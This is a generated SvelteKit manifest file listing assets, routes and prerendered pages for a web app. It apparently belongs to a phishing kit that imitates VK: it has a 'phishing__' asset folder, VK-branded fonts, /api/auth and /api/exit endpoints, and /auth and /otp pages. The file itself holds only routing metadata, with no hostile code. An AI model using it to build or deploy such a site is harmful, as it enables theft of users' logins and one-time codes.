const manifest = (() => {
function __memo(fn) {
	let value;
	return () => value ??= (value = fn());
}

return {
	appDir: "_app",
	appPath: "_app",
	assets: new Set(["favicon.png","phishing__/base-c7ea6308.svg","phishing__/error404.png","phishing__/favicon.ico","phishing__/fonts/Roboto-VK-Bold.woff","phishing__/fonts/Roboto-VK-Bold.woff2","phishing__/fonts/Roboto-VK-Medium.woff","phishing__/fonts/Roboto-VK-Medium.woff2","phishing__/fonts/Roboto-VK-Normal.woff","phishing__/fonts/Roboto-VK-Normal.woff2","phishing__/global.css","phishing__/icon.png","phishing__/logo-192.png","phishing__/logo-512.png","phishing__/logo.svg","phishing__/manifest.json","phishing__/maskable.png","robots.txt"]),
	mimeTypes: {".png":"image/png",".svg":"image/svg+xml",".ico":"image/vnd.microsoft.icon",".woff":"font/woff",".woff2":"font/woff2",".css":"text/css",".json":"application/json",".txt":"text/plain"},
	_: {
		client: {"start":"_app/immutable/entry/start.1b2817b3.js","app":"_app/immutable/entry/app.7cbef127.js","imports":["_app/immutable/entry/start.1b2817b3.js","_app/immutable/chunks/scheduler.63274e7e.js","_app/immutable/chunks/singletons.6aadf466.js","_app/immutable/entry/app.7cbef127.js","_app/immutable/chunks/scheduler.63274e7e.js","_app/immutable/chunks/index.95432262.js"],"stylesheets":[],"fonts":[]},
		nodes: [
			__memo(() => import('./chunks/0-796d6136.js')),
			__memo(() => import('./chunks/1-954e9e91.js')),
			__memo(() => import('./chunks/2-ff31e5c8.js'))
		],
		routes: [
			{
				id: "/",
				pattern: /^\/$/,
				params: [],
				page: { layouts: [0,], errors: [1,], leaf: 2 },
				endpoint: null
			},
			{
				id: "/api/auth",
				pattern: /^\/api\/auth\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-977ae86f.js'))
			},
			{
				id: "/api/exit",
				pattern: /^\/api\/exit\/?$/,
				params: [],
				page: null,
				endpoint: __memo(() => import('./chunks/_server.ts-1ca24d41.js'))
			}
		],
		matchers: async () => {
			
			return {  };
		}
	}
}
})();

const prerendered = new Set(["/auth","/auth/__data.json","/otp","/otp/__data.json"]);

export { manifest, prerendered };
//# sourceMappingURL=manifest.js.map
